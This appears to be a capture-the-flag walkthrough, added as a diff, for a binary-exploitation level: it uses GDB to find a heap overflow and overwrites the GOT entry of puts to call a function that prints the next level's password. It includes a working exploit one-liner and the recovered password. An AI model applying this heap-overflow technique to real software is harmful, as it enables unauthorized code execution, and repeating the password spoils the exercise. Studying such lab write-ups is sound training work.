@@ -1,0 +1,66 @@
+# Level7 - Heap Overflow with GOT Overwrite
+
+---
+
+# Walkthrough
+
+## Step 1: Test the program
+
+```bash
+./level7
+Segmentation fault (core dumped)
+
+./level7 arg1 arg2
+~~
+```
+
+Program needs 2 arguments.
+
+## Step 2: Analyze with GDB
+
+```bash
+gdb level7
+(gdb) info functions
+```
+
+Found: `m` (not called), `main`.
+
+## Step 3: Check function `m`
+
+```bash
+(gdb) disas m
+```
+
+`m` prints variable at `0x8049960`. Address of `m`: `0x080484f4`
+
+## Step 4: Analyze main
+
+```bash
+(gdb) disas main
+```
+
+Key operations:
+- `fopen("/home/user/level8/.pass")` → Opens password file
+- `fgets` → Reads password to `0x8049960`
+- `strcpy(block2, argv[1])` → First copy (vulnerable)
+- `strcpy(block4, argv[2])` → Second copy
+- `puts("~~")` → Prints `~~`, not the password
+
+## Step 5: Find GOT of `puts`
+
+```bash
+(gdb) disas 0x8048400
+   0x08048400 <+0>:  jmp *0x8049928
+```
+
+GOT of `puts`: `0x8049928`
+
+## Step 6: Build the exploit
+
+```bash
+./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+```
+
+**Password:** `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`
+
+---
